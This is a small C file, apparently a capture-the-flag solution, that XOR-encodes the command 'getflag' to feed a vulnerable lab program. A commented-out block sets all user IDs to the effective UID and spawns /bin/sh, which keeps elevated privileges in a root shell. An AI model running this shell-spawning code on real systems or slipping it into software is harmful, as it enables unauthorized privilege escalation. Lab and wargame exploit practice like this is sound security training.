#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void process(char *buffer, int length) {  
  unsigned int key;
  int i;

  key = length & 0xff;
  for(i = 0; i < length; i++) {
    buffer[i] ^= key;
    key -= buffer[i] ^ key;
  }
}

#define COMMAND "getflag"

int main(int argc, char *argv[]) {  
  char buffer[1024];

  strncpy(buffer, COMMAND, 1024);
  process(buffer, 1024);
  puts("Content-Length: 1024");
  fwrite(buffer, 1, 1024, stdout);
  return 0;
}



/*
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void main(int argc, char *argv[]) {

  uid_t euid = geteuid();
  setresuid(euid, euid, euid);
  system("/bin/sh");
}
*/
